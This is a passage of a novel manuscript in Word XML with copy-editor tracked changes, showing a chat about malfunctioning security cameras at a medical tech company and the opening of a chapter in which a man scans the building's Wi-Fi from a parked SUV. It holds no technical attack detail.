    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I'm not seeing things!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>ok i believe u :)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>is it unusual? Maybe they adjust themselves at night.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I... don't know?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I've never paid attention.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>and y</w:t>
      </w:r>
      <w:commentRangeStart w:id="612"/>
      <w:r w:rsidRPr="000D3488">
        <w:t>oure</w:t>
      </w:r>
      <w:commentRangeEnd w:id="612"/>
      <w:r w:rsidR="00BD75DE">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:commentReference w:id="612"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:t xml:space="preserve"> paying attention to the camera now</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>distracting yourself with some unimportant unrelated matter</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>instead of dealing head-on with your real issues at work.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>if you didnt hate it when i analyze you, I MIGHT call this a classic example of deflection... ;)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>You suck, Nat. :)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>So then, O Wizened Witch-Woman.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>What kind of spell can I use to improve this total shit-show I've got here?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Here's the potion for my life right now: take one part romantic failure, two parts professional failure, stir them in a crucible made of tungsten, and choke it down cold and bitter.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>*hugs*</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>sorry things suck for you so much right now, t</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>Got a prescription for me, maybe?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>u already know what i think.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>hook up with one of the scientists to make roger jealous :P</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>How about no more dating guys from the office?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>They're all dipshits. Everybody here sucks. I get zero respect here. ZERO.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I try to talk shop with the lab monkeys sometimes, and they just humor me. Like, “Aww how cute! The Xerox girl is trying to use big words!”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Fuck, they don't know me! They don't know that I know this shit.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>All I want is for them to give me a</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Dammit hold on. THIS is weird.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>??</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>brb</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Ok back.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I'm NOT losing it. The cameras ARE fucked up.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>whats going on t?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>The camera was turning back and forth inside its dome thingie.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I drag my chair and stand on it and smack the dome, and it stops.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>But I see through the glass wall into the main hallway, there's a couple cameras in the hallway, and one of them is just a couple yards away. And while I'm standing on my chair, I see THAT one is doing it too.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>So I go into the hall and find another chair and whack THAT camera too. BUT.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>While I'm dragging the chair, I see the camera at the OTHER end of the hall is ALSO going nuts.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>Nat.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00241C34">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>EVERY CAMERA IN THE BUILDING IS SPINNING AROUND.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>ok, that aint right.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I KNOW RIGHT!?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I don't know what's going on.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>It's freaking me out.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="MsgRecv"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>im sure its just a glitch.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>All I know is, when I whack them, it seems to fix it.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>I better go around to the rest of the cameras and take care of it.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00873D42">
      <w:pPr>
        <w:pStyle w:val="MsgSend"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Nat, I'll catch you later.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>8</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Danny’s face was lit from afar</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> by invisible light, in a shade of red too deep to be seen by the human eye. He and the other four men sat in Jason’s black Lincoln Navigator SUV parked across the street from the broad suburban office building that housed Tungsten Medical Technologies.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“Any luck?” asked Jason from behind the wheel.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sat in the passenger’s seat, staring at his laptop. His tote bag, filled with the pieces of his contraption, lay at his feet. “Some. I’ve got several access points in range, but only barely.”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Inside Tungsten’s building, dozens of computers transmitted signals to each other through electromagnetic vibrations. At its heart, the process was no more complex than blinking lights — but only someone like Danny would </w:t>
      </w:r>
      <w:ins w:id="613" w:author="TextVet" w:date="2016-03-16T13:52:00Z">
        <w:r w:rsidR="000C2669">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>call</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="614" w:author="TextVet" w:date="2016-03-16T13:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000C2669">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>think of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> them </w:t>
      </w:r>
      <w:del w:id="615" w:author="TextVet" w:date="2016-03-16T13:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000C2669">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">as </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">“lights”. Most people would </w:t>
      </w:r>
      <w:ins w:id="616" w:author="TextVet" w:date="2016-03-16T13:53:00Z">
        <w:r w:rsidR="00CD31E2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>consider</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="617" w:author="TextVet" w:date="2016-03-16T13:53:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CD31E2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>think of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> them</w:t>
      </w:r>
      <w:del w:id="618" w:author="TextVet" w:date="2016-03-16T13:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CD31E2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> as</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> antennas, </w:t>
      </w:r>
      <w:del w:id="619" w:author="TextVet" w:date="2016-03-16T13:53:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005E7603">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">and would </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>say</w:t>
      </w:r>
      <w:ins w:id="620" w:author="TextVet" w:date="2016-03-16T13:53:00Z">
        <w:r w:rsidR="005E7603">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they were emitting radio waves. But for Danny, when it came to things </w:t>
      </w:r>
      <w:ins w:id="621" w:author="TextVet" w:date="2016-03-16T13:53:00Z">
        <w:r w:rsidR="00D97C86">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>such as</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="622" w:author="TextVet" w:date="2016-03-16T13:53:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D97C86">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>like</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> light bulbs</w:t>
      </w:r>
      <w:ins w:id="623" w:author="TextVet" w:date="2016-03-16T13:53:00Z">
        <w:r w:rsidR="00D97C86">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="624" w:author="TextVet" w:date="2016-03-16T13:53:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D97C86">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> or</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Wi-Fi transceivers or Naval radar systems, the difference was literally in the </w:t>
      </w:r>
      <w:del w:id="625" w:author="TextVet" w:date="2016-03-16T13:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004736D9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">eye of the </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>beholder</w:t>
      </w:r>
      <w:ins w:id="626" w:author="TextVet" w:date="2016-03-16T13:54:00Z">
        <w:r w:rsidR="004736D9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">’s </w:t>
        </w:r>
        <w:r w:rsidR="004736D9" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>eye</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. They all worked by sending out photons, and whether the receiving antenna was a thin strand of copper wire inside a computer’s network card or a rhodopsin protein in a rod cell in his retina, the underlying physical principles were invariant.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were pine trees planted beside the office building, arranged in neat woodchip-lined rows. Danny had chosen to park across from these trees intentionally, to stay out of sight. But the pines obscured visible and invisible light alike.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“Move the car over there</w:t>
      </w:r>
      <w:ins w:id="627" w:author="TextVet" w:date="2016-03-16T13:55:00Z">
        <w:r w:rsidR="00DF5875">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="628" w:author="TextVet" w:date="2016-03-16T13:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DF5875">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, where</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the trees are thinner,” Danny </w:t>
      </w:r>
      <w:del w:id="629" w:author="TextVet" w:date="2016-03-16T13:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FD5A35">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w:t>
      </w:r>
      <w:ins w:id="630" w:author="TextVet" w:date="2016-03-16T13:55:00Z">
        <w:r w:rsidR="00FD5A35">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>irected</w:t>
        </w:r>
        <w:r w:rsidR="00D34EA9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="631" w:author="TextVet" w:date="2016-03-16T13:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D34EA9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> while</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> pointing.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Pine trees were </w:t>
      </w:r>
      <w:ins w:id="632" w:author="TextVet" w:date="2016-03-16T13:56:00Z">
        <w:r w:rsidR="00317A2F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>a</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>liv</w:t>
      </w:r>
      <w:ins w:id="633" w:author="TextVet" w:date="2016-03-16T13:56:00Z">
